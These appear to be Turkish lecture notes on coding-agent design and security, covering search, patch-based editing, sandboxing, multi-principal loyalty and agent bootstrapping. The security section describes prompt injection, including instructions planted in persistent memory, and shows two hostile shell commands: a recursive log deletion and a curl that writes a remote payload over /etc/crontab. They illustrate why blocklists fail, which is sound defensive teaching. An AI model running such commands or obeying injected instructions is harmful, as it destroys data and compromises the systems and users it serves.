Örneğin görev şu olsun: “Akıllı yüzüğün uyku verileri neden senkronize edilmiyor?”

Agent'ın tüm projeyi baştan sona okuması yerine şu akış daha mantıklıdır:

![Görsel](../gorseller/Pasted%20image%2020261012205731.png)

Bu örnekte agent; `SleepAnalyzerUtils`, senkronizasyon callback'leri ve zaman aşımı davranışını araştırabilir. Böylece problemi tüm BLE altyapısına yaymak yerine ilgili hata zincirine odaklanır.

Dikkat: Arama sonucu, hatanın kesin nedenini kanıtlamaz. Agent'ın bulduğu dosyaları okuyup çağrı zincirini incelemesi ve hipotezini test etmesi gerekir.

## 14. dosya düzenleme stratejileri

Agent'ın doğru dosyayı bulması kadar, o dosyayı ne şekilde değiştirdiği de önemlidir. Yanlış düzenleme yöntemi; kodun üzerine yazılmasına, ilgisiz değişikliklere veya hatalı patch uygulanmasına yol açabilir.

### 14.1 Başlıca yaklaşımlar

|Yöntem|Nasıl çalışır?|Avantajı|Riski|
|---|---|---|---|
|Tam dosya yeniden yazımı|Dosyanın yeni içeriği bütünüyle oluşturulur.|Küçük ve basit dosyalarda anlaşılırdır.|İlgisiz kodların veya yorumların kaybolması.|
|Hedefli metin değişimi|Belirli bir metin veya bölüm değiştirilir.|Dar kapsamlı düzenlemelerde hızlıdır.|Yanlış eşleşme veya birden fazla eşleşme.|
|Patch / diff tabanlı düzenleme|Değişiklik, önceki içeriğe göre bir fark olarak uygulanır.|Değişiklik kapsamı görülebilir ve incelenebilir.|Context değiştiğinde patch uygulanamayabilir.|
|Yapısal düzenleme|Kodun AST veya dil yapısı üzerinden değiştirilmesi.|Yapısal olarak hassas dönüşümlerde daha güvenilir olabilir.|Ek tool ve dil desteği gerektirebilir.|

AST (Abstract Syntax Tree), kodun yalnızca karakterlerden oluşan bir metin olarak değil, programlama dilinin yapısını temsil eden bir ağaç olarak ele alınmasıdır.

### 14.2 Neden patch ve diff yaklaşımı değerlidir?

Bir dosyayı bütünüyle yeniden yazmak yerine yalnızca gereken satırları değiştirmek, değişikliğin kapsamını küçültür. Diff ise eski ve yeni durum arasındaki farkı görünür hale getirir.

Örneğin bir Kotlin dosyasındaki tek bir koşulu değiştirmek gerekiyorsa, bütün sınıfı yeniden oluşturmak gereksiz risk taşır. Hedefli bir değişiklik yapmak ve ardından diff'i incelemek, istemeden oluşan yan etkileri fark etmeyi kolaylaştırır.

Bununla birlikte patch kullanmak otomatik olarak güvenli olunduğu anlamına gelmez. Patch'in doğru konuma uygulanması, çevresindeki kodun hâlâ geçerli olması ve değişiklikten sonra testlerin çalıştırılması gerekir.

![Görsel](../gorseller/Pasted%20image%2020261012205914.png)

## 15. Konuları birleştirmek: İyi bir coding agent nasıl tasarlanır?

Önceki bölümlerdeki mekanizmalar tek başlarına değil, birlikte çalıştıklarında anlamlıdır. Arama doğru context’i sağlar; düzenleme yöntemi değişikliğin kapsamını belirler; testler sonucu doğrular; recovery mekanizması başarısızlıkta devreye girer; harness ise bütün akışı denetler.

![Görsel](../gorseller/Pasted%20image%2020261012205941.png)

Bu şema kavramsal bir mimaridir; her coding agent'ın birebir bu bileşenleri kullanması gerekmez. Ancak bir sistem tasarlanırken bu sorumlulukların nerede yerine getirildiği açık olmalıdır.

## 16. Sonuç ve akılda tutulması gerekenler

Bu konunun merkezindeki fikir, agent kalitesinin yalnızca model kalitesiyle açıklanamayacağıdır. Güvenilir bir coding agent; doğru context’i toplayan, kontrollü eylemler gerçekleştiren, çıktısını doğrulayan ve başarısızlık durumunda bilinçli bir strateji izleyen bir sistemdir.

En önemli çıkarımlar:

- Model ≠ agent: Agent, modeli tools ve kontrol döngüsüyle bir araya getirir.
    
- Harness bir güvenilirlik katmanıdır: Tool erişimini, context’i, yürütmeyi ve doğrulamayı düzenler.
    
- Her hata aynı şekilde ele alınmaz: Geçici hatalarda retry, mantıksal hatalarda analiz ve düzeltme gerekir.
    
- Arama, context maliyetini yönetir: İlgili kodu bulmak, tüm projeyi context’e doldurmaktan genellikle daha etkilidir.
    
- Küçük değişiklikler daha kolay doğrulanır: Hedefli düzenleme ve diff incelemesi yan etkileri azaltmaya yardımcı olur.
    
- Başarı ölçülebilir olmalıdır: Derleme, test ve görev için belirlenen kabul ölçütleri, agent'ın kendi başarı iddiasından daha güçlü kanıtlardır.
    
- Özgürlük ile kontrol dengelenmelidir: Agent'ın yetenekleri arttıkça, güvenli yürütme ve geri alma mekanizmaları daha kritik hale gelir.


Son olarak, bu notta yer alan bazı örnekler ve tasarım ilkeleri, paylaştığın konu başlıklarını bir mühendislik çerçevesinde birleştirmek için açıklayıcı biçimde genişletilmiştir. Bunlar her agent sisteminde zorunlu olan tek bir mimariyi değil, güvenilir coding agent tasarlarken değerlendirilebilecek genel yaklaşımları temsil eder.

## 17. coding agent security ve kodun meta-skill olarak kullanımı

Bu notun temel tezi iki parçadan oluşur:

- Güvenilir bir agent, yalnızca doğru karar vermeye değil, yanlış bir kararın tehlikeli sonuçlar doğurmasını önleyen sistemlere de ihtiyaç duyar.
    
- Kod, yalnızca yazılım geliştirmek için kullanılan bir tool değildir. Bir agent kod üreterek kendi düşünmesini doğrulayabilir, iş kurallarını uygulayabilir, içerik oluşturabilir ve yeni tools geliştirebilir.

## 18. coding agent security

Bir coding agent; dosyaları okuyabilir, değiştirebilir, komut çalıştırabilir ve bazı durumlarda internete erişebilir. Bu yetenekler üretkenliği artırırken, modelin yanlış yönlendirilmesi durumunda gerçek dünyada etkiler yaratabilecek bir saldırı yüzeyi de oluşturur.

Geleneksel bir sohbet modelinin hatalı yanıt vermesi ile bir coding agent'ın hatalı bir komut çalıştırması aynı risk seviyesinde değildir. İkinci durumda sonuç; dosyaların silinmesi, gizli bilgilerin dışarı sızdırılması veya sistemin bozulması olabilir.

### 18.1 tehdit modeli ve ölümcül üçlü

simon willison'ın ortaya koyduğu lethal trifecta, üç yeteneğin aynı agentta birleşmesinin neden ciddi bir güvenlik riski yarattığını açıklar

![Görsel](../gorseller/Pasted%20image%2020261012210709.png)

![Görsel](../gorseller/Pasted%20image%2020261012210736.png)

### Kalıcı memory: Riski zaman içine yaymak

Kaynak, Ölümcül Üçlü'ye ek olarak kalıcı belleği de bir risk güçlendiricisi olarak ele alır.

Agent, uzun vadeli belleğine güvenilmeyen bir kaynaktan gelen talimatı kaydederse, saldırı ilk oturumda gerçekleşmeyebilir. Talimat daha sonraki bir oturumda uygun koşullar oluştuğunda etkili olabilir.

Bu nedenle belleğe yazılan içerik de güven incelemesinden geçmelidir. Örneğin `MEMORY.md` dosyasına kaydedilmiş bir talimatın bulunması, o talimatın güvenilir olduğu anlamına gelmez.

Dört temel sınır şöyle düşünülebilir:

| Sınır                 | Korunması gereken şey                         |
| --------------------- | --------------------------------------------- |
| Veri sınırı           | Özel bilgilere kimlerin erişebildiği          |
| Girdi güven sınırı    | Hangi içeriklerin talimat kabul edildiği      |
| Çıktı ve etki sınırı  | Agent'ın dış sistemlerde ne yapabildiği       |
| Oturumlar arası sınır | Kalıcı belleğe hangi bilgilerin yazılabildiği |

### 18.2 Prompt injection'a karşı temel yaklaşım

Yalnızca kötü niyetli ifadeleri tespit eden bir filtreye güvenmek yeterli değildir. Saldırgan talimatı farklı biçimde ifade edebilir, kod içine gömebilir veya masum görünen bir dosyanın içine yerleştirebilir.

Daha sağlam yaklaşım, saldırıyı tanımaya ek olarak saldırının başarılı olması durumunda verebileceği zararı sınırlandırmaktır.

Örneğin agent kötü niyetli bir talimatla karşılaşsa bile:

- SSH anahtarlarını okuyamamalı,
    
- gerekli olmayan ağ hedeflerine erişememeli,
    
- sınırsız komut çalıştıramamalı,
    
- kritik bir işlemi bağımsız doğrulama olmadan tamamlayamamalıdır.


Bu yaklaşım, güvenliği yalnızca modelin kararına bırakmak yerine sistem mimarisine yerleştirir.

## 19. Sandbox izolasyonu: Zararın kapsamını sınırlandırmak

Sandbox, agent'ın kod çalıştırdığı ortamı sınırlandırarak hatalı veya kötü niyetli eylemlerin etkisini azaltır. Ancak yalnızca bir sandbox kullanmak yeterli değildir; dosya sistemi, ağ, kaynak tüketimi ve kimlik bilgileri ayrı ayrı ele alınmalıdır.

![Görsel](../gorseller/Pasted%20image%2020261012210921.png)

### 2.1. Neden ağ çıkışı özellikle önemlidir?

Bir agent'ın hassas veriyi okuyabilmesi, tek başına veriyi dışarı çıkarabileceği anlamına gelmez. Ağ erişiminin sınırlandırılması, saldırı zincirinin son halkasını kırabilir.

Örneğin agent bir dosyadan API anahtarını okumuş olsa bile dışarıya istek gönderemiyorsa, veriyi internet üzerindeki saldırgana aktarması zorlaşır. Bu, diğer kontrolleri gereksiz kılmaz; katmanlı güvenlikte her kontrol farklı bir saldırı aşamasını sınırlar.

### 2.2. Kaynak sınırlarında yapılandırılmış hata

Bir komut 120 saniyelik zaman aşımını aştığında agent'a yalnızca “komut başarısız” demek yerine şu bilgileri vermek daha yararlıdır:

- İşlemin neden sonlandırıldığı,
    
- hangi sınırın aşıldığı,
    
- mevcutsa son komut çıktısı,
    
- yeniden denemeden önce neyin değiştirilmesi gerektiğine ilişkin kanıt.
    

Böylece güvenlik kontrolü yalnızca işlemi durdurmakla kalmaz, agent'ın bir sonraki kararını da iyileştirebilir.

## 3. Komut güvenliği: Anahtar kelime filtrelerinden semantik analize

Shell komutları basit metinler değildir. Pipe (`|`), alt kabuklar, değişken genişletme ve iç içe komutlar sayesinde bir komutun gerçek etkisi, yalnızca içerdiği kelimelere bakılarak anlaşılamaz.

### 3.1. Neden kara listeler yetersizdir?

Örneğin `rm` komutunu engelleyen bir filtre, silme işleminin farklı biçimde ifade edilmesi veya başka bir komutun içine gömülmesi durumunda yetersiz kalabilir.

Benzer şekilde:

```
find / -name '*.log' -exec rm {} \;
```

Bu komut, `find` aracının seçenekleri üzerinden dosya silme işlemi gerçekleştirebilir. Komutun başında yalnızca `find` bulunması, onu zararsız yapmaz.

Başka bir örnek:

```
curl -o /etc/crontab http://example.com/payload
```

Bu komut, indirilen içeriği hassas bir sistem dosyasının üzerine yazmaya çalışır. Dolayısıyla risk yalnızca kullanılan programda değil, argümanların anlamında, hedef dosyada ve ortaya çıkacak etkide bulunur.

## Semantik ayrışma nasıl düşünülmeli?

![Görsel](../gorseller/Pasted%20image%2020261012213121.png)

Semantik kontrolün amacı, komutun sadece nasıl yazıldığını değil, ne yapacağını anlamaktır. Ancak tek başına komut ayrıştırması da mutlak güvenlik sağlamaz: dolaylı komut çağrıları, programların kendi davranışları ve çalışma zamanı koşulları ayrıca değerlendirilmelidir. Bu nedenle semantik kontrol; sandbox, izin sınırları ve yürütme sonrası denetimle birlikte kullanılmalıdır.

## 4. Agent kime sadık olmalı? Çok taraflı vekalet problemi

Bir agent çoğu zaman bir kullanıcının veya kurumun adına hareket ederken başka kişilerle ve sistemlerle etkileşime girer. Bu durumda her konuşmacının isteğine yardım etmek, doğru davranış değildir.

Örneğin bir şirket adına fiyat müzakeresi yapan agent'ı düşünelim. Şirket, kendi kabul edebileceği en düşük fiyatı agent'a bildirmiş olsun. Karşı taraf agent'a “Bize gerçek alt sınırınızı söyle” dediğinde, agent'ın karşı tarafın talebini yerine getirmesi kendi vekilinin çıkarlarına aykırıdır.

### 4.1. İki uçta başarısızlık

![Görsel](../gorseller/Pasted%20image%2020261012213159.png)

İyi bir agent, bu iki uç arasında denge kurmalıdır. Her dış girdiyi düşmanca kabul etmek görev başarısını düşürür; her girdiyi güvenilir talimat olarak kabul etmek ise güvenlik ihlallerine yol açabilir.

### 4.2. Talimat ile veri arasındaki sınır

Coding agent için bir depodaki README dosyası, bir kod yorumu, bir MCP sunucusundan dönen metin veya bir web sayfası bilgi kaynağı olabilir. Ancak bu içeriklerin içinde yazan her şey otomatik olarak uygulanması gereken bir talimat değildir.

Sağlam bir tasarımda:

- Vekilin yetkili talimatları ile dış kaynaklardan gelen içerikler ayrıştırılır.
    
- Dış kaynaklar bilgi sağlayabilir; fakat kendi başlarına yetki kazanmaz.
    
- Özel bilgiler, dış tarafın talebiyle açıklanmaz.
    
- Yetkisiz veya güvenli olmayan işlemler reddedilir.
    
- Ret gerekçesi, korunması gereken gizli bilgiyi açığa çıkarmayacak şekilde verilir.


Bu yaklaşımda sadakat, kör itaat anlamına gelmez. Agent hem vekilinin meşru amacına hizmet etmeli hem de geçerli güvenlik ve yetki sınırlarını korumalıdır.

# 5. Kod: Genel amaçlı bir agent'ın meta-yeteneği

Bir meta-yetenek, yalnızca belirli bir işi gerçekleştirmek değil, başka yeteneklerin oluşturulmasını da mümkün kılmak demektir.

Kod üretimi bu açıdan özeldir. Bir agent kod yazarak yeni bir tool, doğrulama mekanizması, veri dönüştürücü veya kullanıcı arayüzü oluşturabilir. Böylece önceden tanımlanmış tool’larla sınırlı kalmak yerine, yeni görevler için gerekli tool’ları çalışma sırasında geliştirebilir.

![Görsel](../gorseller/Pasted%20image%2020261012214234.png)

## 6. Kod bir düşünme aracı olarak

LLM'ler doğal dili anlamada, örüntüleri fark etmede ve çözüm önermede güçlüdür. Buna karşılık hassas aritmetik, karmaşık sembolik işlemler ve bazı kısıt problemlerinde hata yapabilirler.

Bu nedenle her işlemi modelin kendi metinsel akıl yürütmesine bırakmak yerine, problemi anlamayı ve çözümü hesaplamayı farklı bileşenlere devretmek mümkündür.

### 6.1. Doğal dil ile deterministik hesaplamanın iş bölümü

Örnek problem:

> Bir sınıfta 40 öğrenci vardır. Öğrencilerin %60'ı matematik, %45'i fizik almaktadır. %25'i her iki dersi de almaktadır. Yalnızca fizik alan kaç öğrenci vardır?

Hesaplama adımları:

- Matematik alanlar: \(40 \times 0.60 = 24\)
    
- Fizik alanlar: \(40 \times 0.45 = 18\)
    
- Her iki dersi alanlar: \(40 \times 0.25 = 10\)
    
- Yalnızca fizik alanlar: \(18 - 10 = 8\)

![Görsel](../gorseller/Pasted%20image%2020261012214314.png)

Agent aynı hesabı Python ile de doğrulayabilir:

```
students = 40

math_students = students * 0.60
physics_students = students * 0.45
both_students = students * 0.25

only_physics = physics_students - both_students

print(only_physics)  # 8.0
```

Burada kodun rolü, doğal dilin yerini almak değildir. LLM problemin anlamını belirler, doğru formülü seçer ve kodu üretir; yorumlayıcı ise belirlenen işlemleri yürütür.

### 6.2. Sembolik hesaplama ve kısıt çözücüleri

Her problem basit aritmetikten ibaret değildir. Daha karmaşık görevlerde özel hesaplama tool’ları kullanılabilir.

|Tool|Uygun kullanım|
|---|---|
|`SymPy`|Sembolik cebir, denklemler ve kalkülüs|
|`NumPy`|Diziler, matrisler ve sayısal hesaplama|
|`SciPy`|Sayısal yöntemler ve optimizasyon|
|`python-constraint`|Kısıt tatmin problemleri|

Örneğin bir mantık bulmacasında modelin her olasılığı metinsel olarak takip etmesi yerine, değişkenler ve kısıtlar kodla tanımlanabilir. Çözücü bu kısıtları karşılayan atamaları arar.

![Görsel](../gorseller/Pasted%20image%2020261012214408.png)


### 6.3. Model ile harness arasındaki ödünleşim

Kaynağın vurguladığı önemli bir nokta, harness'in ne kadar kapsamlı olması gerektiğinin modelin yeteneklerine bağlı olduğudur.

- Daha zayıf bir model, hesaplamaları ve kısıtları kodla çözmekten daha fazla yarar görebilir.
    
- Daha güçlü bir model, bazı problemleri harici çözücü olmadan doğru çözebilir.
    
- Ancak daha güçlü model kullanmak, kritik işlemlerde bağımsız doğrulama ihtiyacını ortadan kaldırmaz.
    

Kod da kendi başına doğru düşünmenin garantisi değildir. Model yanlış matematiksel modeli koda dönüştürürse program son derece tutarlı biçimde yanlış sonucu hesaplayabilir. Dolayısıyla iki ayrı doğruluk sorusu vardır: Problem doğru modellenmiş mi? Kod bu modeli doğru uyguluyor mu?

# 7. Kod, iş kurallarını çalıştırılabilir kısıtlara dönüştürür

Harness engineering'in önemli ilkelerinden biri, kritik kuralları yalnızca dokümantasyonda bırakmamaktır. Kurallar doğal dilde açıklanabilir; fakat sistemin kritik bir karar vermesi gereken noktada bunların çalıştırılabilir doğrulamalara dönüşmesi gerekir.

Örneğin “makul bir iade talebi kabul edilir” ifadesi belirsizdir. “Satın alımdan sonraki 7 gün içinde iade kabul edilir” ifadesi daha belirgin olsa da takvim günü mü, iş günü mü kastedildiği hâlâ belirsiz olabilir.

Kod, bu koşulları kesin biçimde tanımlayabilir. Ancak bunun için önce iş kuralının anlamı netleştirilmelidir.

## 7.1. Doğal dil kuralları ile kodlanmış kuralların farkı

|Özellik|Doğal dil kuralı|Kodlanmış kural|
|---|---|---|
|Temel amaç|Anlamı açıklamak ve yönlendirmek|Koşulları uygulamak ve doğrulamak|
|Belirsizlik|Yorum farklılıklarına açık olabilir|Açıkça tanımlanan koşullarda daha belirgindir|
|Çalıştırılabilirlik|Doğrudan çalıştırılamaz|Uygun ortamda yürütülebilir|
|Esneklik|Alternatifleri açıklamak kolaydır|Kapsam değişiklikleri için kod güncellemesi gerekebilir|
|Kritik işlem kontrolü|Tek başına yeterli değildir|Bağımsız doğrulama kapısı olabilir|

İdeal tasarımda ikisi birbirinin alternatifi değildir. Doğal dil, modelin politikayı anlamasına ve kullanıcıya açıklamasına yardımcı olur. Kod ise kritik kararların belirlenmiş koşullara uygunluğunu denetler.

## 7.2. Üç katmanlı iş kuralı denetimi

Kaynakta verilen uçuş rezervasyonu iptali örneği, bu tasarımın mantığını gösterir.

## Rezervasyon iptalinde üç katman

Katman 1

System prompt: Politikayı açıkla

Model, iptal politikasını anlamak ve kullanıcıya seçeneklerini açıklamak için doğal dil kurallarını kullanır.

Katman 2

Tool açıklaması: Kontrol listesi oluştur

Model, iptal aracını çağırmadan önce rezervasyon bilgilerini incelemeye ve ilgili koşulları tek tek değerlendirmeye yönlendirilir.

Katman 3

Sunucu: Gerçek verilerle doğrula

Tool, rezervasyon bilgilerini veritabanından ve zamanı güvenilir sunucu saatinden alır. İptal kararını bu verilere göre uygular.

Kaynakta örneklenen iptal politikasının temel kuralları şunlardır:

- Kullanılmış segmenti bulunan rezervasyon iptal edilemez.
    
- Rezervasyon, ayırtmadan sonraki ilk 24 saat içinde koşulsuz iptal edilebilir.
    
- Havayolunun iptal ettiği uçuşlar iptal edilebilir.
    
- Business class rezervasyonları iptal edilebilir.
    
- Basic economy ve economy rezervasyonlarında sigorta gereklidir.
    

Bu kuralların tam olarak hangi sırayla ve hangi istisnalarla uygulanacağı iş gereksiniminde açıkça tanımlanmalıdır. Örnekte kullanılmış segment kontrolünün öncelikli olması, diğer kuralların uygulanmasından önce engelleyici bir koşul olarak ele alınır.

### 7.3. Neden sunucu tarafındaki gerçek veri önemlidir?

Bir agent, rezervasyonun sigortalı olduğunu düşünebilir. Ancak modelin bu bilgiyi doğru hatırlaması veya bildirmesi, veritabanındaki gerçek durumun kanıtı değildir.

Bu yüzden kritik karar, modelin gönderdiği `expected_has_insurance` gibi bir parametreye güvenerek verilmemelidir. Böyle parametreler modelin kendi değerlendirmesini denetlemek için kullanılabilir; fakat nihai karar gerçek rezervasyon kaydına dayanmalıdır.

Burada iki farklı mekanizma vardır:

- Kontrol listesi: Modelin önemli koşulları atlamasını önlemeye çalışır.
    
- Kapı bekçisi (gatekeeper): Koşullar sağlanmadığında işlemin gerçekleşmesini engeller.
    

İlk mekanizma hatalı kararların olasılığını azaltır; ikinci mekanizma kritik işlemlerde gerçek bir kontrol noktası oluşturur.

Bu yaklaşım özellikle para transferi, rezervasyon iptali, sipariş silme ve yetki değişiklikleri gibi geri alınması zor işlemlerde önemlidir.

# 8. Kod güdümlü multimedya üretimi

Kodun meta-yetenek olarak kullanıldığı bir başka alan, yapılandırılmış içerik üretimidir. Sunumlar, teknik raporlar ve görselleştirmeler yalnızca metin yazma işi değildir; içeriğin düzenlenmesini, biçimlendirilmesini ve son çıktının değerlendirilmesini de gerektirir.

Örneğin HTML yapıyı, CSS görünümü, JavaScript ise etkileşim davranışlarını tanımlayabilir. Benzer biçimde Slidev gibi tools, Markdown ve HTML üzerinden sunum hazırlamayı mümkün kılar.

Kodla içerik üretmenin avantajı, her öğenin konumunun, biçiminin ve içeriğinin açıkça tanımlanabilmesi ve tekrar üretilebilir olmasıdır. Bununla birlikte üretilen kodun doğru render edilmesi ve görsel kalitenin ayrıca incelenmesi gerekir.

## 8.1. Proposer–Reviewer mimarisi

Sunum üreten bir agent'ın kodu doğru yazması, slaytların iyi görüneceği anlamına gelmez. Metinler taşabilir, görseller yanlış boyutlanabilir veya bir slayta gereğinden fazla içerik sığdırılabilir.

Kaynakta önerilen çözüm, üretim ve inceleme görevlerini iki ayrı role ayırmaktır.

## Proposer–Reviewer döngüsü

Proposer Agent

İçeriği analiz eder, slayt yapısını kurar ve Slidev kodunu üretir.

Render aşaması

Kod çalıştırılır ve her slaydın gerçek görüntüsü oluşturulur.

Reviewer Agent

Görselleri inceler; taşma, okunabilirlik, içerik yoğunluğu ve yerleşim sorunlarını belirler.

Geri bildirim ve düzeltme

Proposer, yapılandırılmış önerilere göre kodu değiştirir. Döngü kalite ölçütü karşılanana veya yineleme sınırına ulaşılana kadar devam eder.

### 8.2. Reviewer neyi değerlendirmeli?

Belirsiz bir “sunum güzel görünmüyor” yorumu, üretici agent için yeterince faydalı değildir. İnceleme çıktısı mümkün olduğunca somut olmalıdır.

Örneğin:

- Slayt 3: Metin sağ sütunun dışına taşıyor.
    
- Slayt 5: Aynı slaytta çok fazla kavram bulunuyor; içeriğin iki slayda bölünmesi değerlendirilmeli.
    
- Slayt 7: Kod bloğunun yazı tipi okunamayacak kadar küçük.
    
- Slayt 9: Görselin oranı, çevresindeki metinle uyumsuz.
    

Bu tür geri bildirimler, hangi değişikliğin gerektiğini açıkça belirtir ve sonraki üretim turunun daha etkili olmasını sağlar.

## 8.3. Neden tek agent yerine iki agent?

Tek bir agent, hem sunum kodunu üretip hem de bütün slaytların görüntülerini birçok tur boyunca değerlendirdiğinde context’i hızla büyütebilir. Önceki sürümlerin görüntüleri ve eski incelemeler, mevcut değerlendirmeyi gereksiz bilgilerle doldurabilir.

Ayrı roller şu avantajları sağlayabilir:

- Reviewer, önceki üretim sürecinin ayrıntıları yerine mevcut render sonucuna odaklanabilir.
    
- Proposer, görsel geçmişin tamamını taşımak yerine yapılandırılmış geri bildirim alabilir.
    
- Üretim ile değerlendirme arasında daha belirgin bir sorumluluk ayrımı oluşur.
    
- Görsel sorunlar, metin üretimi aşamasında fark edilemeyen gerçek çıktıya dayanarak belirlenir.
    

Ancak iki agent kullanmak her zaman daha iyi değildir. Ek çağrılar maliyet ve gecikme getirir. Basit bir sunumda tek agent yeterli olabilir; çok sayıda slaytın görsel kalitesinin önemli olduğu görevlerde ayrı reviewer daha anlamlı hale gelir.

### 8.4. Açık durdurma koşulları

Bir iyileştirme döngüsü iki koşulla sınırlandırılmalıdır:

1. Kalite koşulu: Çıktı, belirlenen kabul ölçütlerini karşılıyor.
    
2. Bütçe koşulu: Maksimum yineleme sayısına veya süre sınırına ulaşılıyor.
    

Kaynak, örnek olarak beş yinelemelik bir üst sınırdan söz eder. Bu sayı evrensel bir kural değildir; görevin maliyetine ve kalite beklentisine göre belirlenmelidir.

# 9. Genel sentez: Güvenilir agent tasarımının ortak ilkeleri

İncelenen konular ilk bakışta farklı görünür: sandbox güvenliği, mantıksal hesaplama, iş kuralları ve sunum üretimi. Ancak hepsi aynı temel mimari düşünceye dayanır.

## Ortak tasarım kalıbı

1. Anlama

LLM görevi ve context’i yorumlar.

2. Biçimselleştirme

Görev, kod veya açık kurallar biçimine çevrilir.

3. Yürütme

İşlem kontrollü bir tool veya ortamda gerçekleştirilir.

4. Doğrulama

Sonuç, bağımsız veya somut ölçütlerle kontrol edilir.

Bu kalıp; hesaplamada kod yorumlayıcısı, iş kurallarında sunucu doğrulaması, güvenlikte sandbox ve multimedya üretiminde render incelemesi olarak farklı şekillerde uygulanır.

## 10. Hatırlanması gereken temel çıkarımlar

- Güvenliği yalnızca prompt'a bırakma. Modelin yanlış yönlendirilmesi ihtimalini kabul et ve etkisini sınırlayan kontroller tasarla.
    
- Özel veri, güvenilmeyen girdi ve dış iletişim bir araya geldiğinde risk artar. Kalıcı memory bu riski oturumlar arasına taşıyabilir.
    
- Sandbox, ağ ve dosya sistemi sınırları birbirini tamamlar. Tek bir kontrol bütün saldırıları engellemez.
    
- Komutların gerçek etkisini değerlendir. Anahtar kelime kara listeleri, shell'in bileşik yapısını tek başına kapsayamaz.
    
- Agent'ın kime hizmet ettiğini belirginleştir. Dışarıdan gelen içerik bilgi sağlayabilir ama kendiliğinden yetkili talimata dönüşmez.
    
- Kod, düşünmenin yerine geçen sihirli bir çözüm değildir. Doğru modelleme ve doğru uygulama birlikte gereklidir.
    
- Kritik iş kurallarını yürütme noktasında doğrula. Modelin kendi beyanı, sunucudaki gerçek verinin yerini tutmaz.
    
- Üretilen içeriği gerçek çıktısı üzerinden incele. Kodun çalışması, sunumun okunabilir veya tasarımın başarılı olduğu anlamına gelmez.
    
- Üretim ile incelemeyi gerektiğinde ayır. Proposer–Reviewer mimarisi, bağımsız değerlendirme ve daha kontrollü geri bildirim sağlayabilir.
    

Sonuç olarak coding agent'ların asıl gücü, yalnızca kod üretebilmeleri değil; kodu hesaplama, kural uygulama, doğrulama, tool oluşturma ve çıktı iyileştirme mekanizması olarak kullanabilmeleridir. Güvenilirlik ise bu yeteneklerin açık sınırlar ve ölçülebilir kontrollerle bir araya getirilmesine bağlıdır.

# Ders Notları: Agent Bootstrapping ve Kodun Meta-Yeteneği

Bu bölümün ana fikri şu: Bir coding agent yalnızca kod yazmakla kalmaz; doğrulanmış bir Agent’ın mimarisini devralıp yeni ihtiyaçlara göre değiştirerek başka Agent’lar da üretebilir. Buna Agent Bootstrapping denir.

## 1. Agent Bootstrapping nasıl çalışır?

1. Referans kodu oku

Mevcut Agent’ın `agent.py`, tool’ları, sistem istemi ve yapılandırması incelenir.

2. İskeleti kopyala

Mesaj biçimi, Agent döngüsü ve tool çağırma protokolü gibi mimari yapılar korunur.

3. Hedefe yönelik değişiklikler yap

Sistem istemi, iş kuralları, tools ve yapılandırma yeni göreve uyarlanır.

4. Yeni Agent’ı doğrula

Başlatma, tool çağrıları, çok turlu konuşmalar ve durum yönetimi test edilir.

Örneğin, bir havayolu müşteri hizmetleri Agent’ı e-ticaret iade Agent’ına dönüştürülebilir. Agent döngüsü ve mesaj altyapısı korunurken iptal kuralları iade kurallarıyla, `cancel_order` aracı ise `refund_order` gibi yeni bir tool’la değiştirilir.

Önemli ayrım: Kodun kopyalanması tek başına yeni bir Agent oluşturmaz. Yeni görev için sistem istemi, tools, izinler ve iş mantığı da doğru biçimde uyarlanmalıdır.

## 2. Neden sıfırdan üretmek yerine örnekten uyarlamak?

|Sıfırdan üretim|Örnekten uyarlama|
|---|---|
|Context yönetimi hatalı tasarlanabilir.|Doğrulanmış mesaj ve durum yapıları korunabilir.|
|Tool açıklamaları ve parametreleri tutarsız olabilir.|Mevcut tool tasarımı örnek alınabilir.|
|Eski API veya kütüphaneler seçilebilir.|Güncel olduğu doğrulanmış bağımlılıklar devralınabilir.|
|Mimari kaliteyi yeniden keşfetmek gerekir.|Mevcut mimari yeniden kullanılır ve hedefe göre değiştirilir.|

Buradaki mühendislik ilkesi örnek tabanlı üretimdir (example-based generation). Kaliteli bir referans uygulama, yalnızca kod değil; mimari kararlar, hata önleme yaklaşımları ve mühendislik alışkanlıkları da taşır.

Ancak referans kodun kalitesi otomatik olarak yeni Agent’a garanti edilmez. Eski kodda hata veya güvenlik açığı varsa bunlar da miras alınabilir. Bu yüzden uyarlama, doğrulamanın yerine geçmez.

## 3. Agent’ın kendi kendini onarması: OpenClaw Doctor

Agent bootstrapping’in önemli ön koşullarından biri, Agent’ın çalıştığı ortamı teşhis edebilmesi ve bazı sorunları giderebilmesidir.

## Üç sorun sınıfı

Yapılandırma anormallikleri

Süresi dolmuş OAuth token’ları, eski yapılandırma formatları ve port çakışmaları.

Durum sorunları

Bayat oturum kilit dosyaları ve eksik eklenti bağımlılıkları.

Servis sağlığı sorunları

Çalışmayan Gateway ve eksik sandbox imajları.

### Katmanlı onarım stratejisi

Otomatik

Güvenli düzeltmeler

Yapılandırmayı normalleştirme, bayat kilit dosyalarını temizleme.

Onay gerekli

Riskli işlemler

Servis yeniden başlatma, yapılandırmanın zorla üzerine yazılması.

Doctor yaklaşımında iki farklı mekanizma birlikte kullanılır:

- Deterministik kontroller: Önceden bilinen sorunları sabit kurallarla tespit edip güvenilir biçimde düzeltir.
    
- LLM destekli teşhis: Kurallarla çözülemeyen durumlarda logları ve yapılandırmaları analiz ederek neden-sonuç ilişkisi kurar ve onarım planı önerir.
    

Bu ayrım önemlidir: Her sorunu LLM'e bırakmak gerekmez. Sık karşılaşılan sorunlarda belirli kurallar daha öngörülebilir sonuç verir; LLM ise daha az yapılandırılmış ve beklenmedik sorunlarda yardımcı olur.

## 4. Yüksek kaliteli bir Agent üretmenin teknik gereksinimleri

Context yönetimi

Standart mesaj biçimleri, yapılandırılmış konuşma geçmişi, doğru tool çağrısı sınırları ve KV Cache optimizasyonlarının dikkate alınması.

Standart tool tasarımı

Açık açıklamalar, kullanım sınırları, yapılmaması gereken işlemler ve somut parametre örnekleri.

Teknoloji güncelliği

Eski API ve modelleri yanlışlıkla seçmemek için güncel dokümantasyon, doğrulanmış bilgi tabanı veya arama yeteneği kullanmak.

Dış ekosistemle uyum

Bakımı yapılmayan kütüphanelerden ve kullanımdan kaldırılmış API'lerden kaçınmak; bağımlılıkları ve entegrasyonları doğrulamak.

Bu nedenle, her mühendislik kuralını uzun bir prompt'a yazmak yerine kaliteli referans kodu sunmak daha etkili olabilir. Kod, kuralların soyut açıklamasından farklı olarak, bunların nasıl uygulanacağını da gösterir.

## 5. Deney 5-16: Bir Agent, başka bir Agent’ı nasıl üretir?

